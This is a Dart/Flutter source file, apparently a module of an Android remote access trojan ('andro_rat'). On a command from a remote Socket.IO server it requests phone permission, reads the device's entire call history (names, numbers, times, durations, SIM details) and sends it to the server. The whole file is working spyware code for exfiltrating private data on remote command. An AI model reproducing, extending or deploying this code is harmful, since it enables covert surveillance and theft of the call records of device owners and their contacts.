import 'package:call_log/call_log.dart';
import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;

class CallLogs {
  static const remoteTrigger = "callLogs";
  late SocketIO.Socket _socket;

  Future<Map> getPayload({String? upon}) async {
    final Map payload = { "upon": upon ?? "request" };
    if (await _checkPoint()) {
      final Iterable<CallLogEntry> entries = await CallLog.get();
      final List<Map> logs = [];
      for (int i = entries.length - 1; i >= 0; i--) {
        final entry = entries.elementAt(i);
        logs.add(_toMap(entry));
      }
      payload.addAll({ "logs": logs });
    } else {
      payload.addAll({ "error": "Permission denied" });
    }
    
    return payload;
  }

  Future<bool> _checkPoint() async {
    return await Permission.phone.isGranted || await Permission.phone.request().isGranted;
  }

  Map<String, dynamic> _toMap(CallLogEntry entry) {
    return <String, dynamic> {
      "name": entry.name,
      "number": entry.number,
      "date": entry.timestamp,
      "duration": entry.duration,
      "sim": entry.simDisplayName,
      "type": _typeText(entry.callType),
      "phoneAccountId": entry.phoneAccountId,
      "formattedNumber": entry.formattedNumber,
      "cachedNumberType": entry.cachedNumberType,
      "cachedNumberLabel": entry.cachedNumberLabel,
      "cachedMatchedNumber": entry.cachedMatchedNumber,
    };
  }

  String _typeText(CallType? type) {
    switch (type) {
      case CallType.incoming: {
        return "incoming";
      }
      case CallType.outgoing: {
        return "outgoing";
      }
      case CallType.missed: {
        return "missed";
      }
      case CallType.voiceMail: {
        return "voice-mail";
      }
      case CallType.rejected: {
        return "rejected";
      }
      case CallType.blocked: {
        return "blocked";
      }
      case CallType.answeredExternally: {
        return "answered-externally";
      }
      case CallType.unknown: {
        return "unknown";
      }
      case CallType.wifiIncoming: {
        return "wifi-incoming";
      }
      case CallType.wifiOutgoing: {
        return "wifi-outgoing";
      }
      default: {
        return ""; // "unknown" already declared as a constant
      }
    }
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      sendPayload(upon: "request");
    });

    _initListeners();
  }

  void _initListeners() {
  }

  void _sendPayload(String remoteTrigger, payload) {
    _socket.emit(remoteTrigger, payload);
  }

  Future<void> sendPayload({ String? upon }) async {
    Debug.log("[Sending Call Logs]:");
    _sendPayload(remoteTrigger, await getPayload(upon: upon));
    Debug.log(":[End Sending Call Logs]");
  }

}
